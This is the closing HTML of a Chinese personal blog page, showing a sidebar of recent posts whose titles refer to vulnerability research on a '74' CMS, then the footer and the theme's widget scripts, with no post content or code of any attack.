href="/2021/01/03/%E5%86%8D%E6%8E%A274%E4%B9%8B%E5%85%A8%E7%89%88%E6%9C%AC%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/" title="再探74之全版本缓存问题">再探74之全版本缓存问题</a><time datetime="2021-01-03T09:04:47.000Z" title="发表于 2021-01-03 17:04:47">2021-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/03/%E5%86%8D%E6%8E%A274%E4%B9%8B%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" title="再探74之全版本通杀前台注入"><img src="https://img-blog.csdnimg.cn/20210103150707130.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="再探74之全版本通杀前台注入"/></a><div class="content"><a class="title" href="/2021/01/03/%E5%86%8D%E6%8E%A274%E4%B9%8B%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" title="再探74之全版本通杀前台注入">再探74之全版本通杀前台注入</a><time datetime="2021-01-03T06:59:01.000Z" title="发表于 2021-01-03 14:59:01">2021-01-03</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://img-blog.csdnimg.cn/20201102182821174.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 秋水</div><div class="footer_custom_text">欢迎来到我的博客~~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":300,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
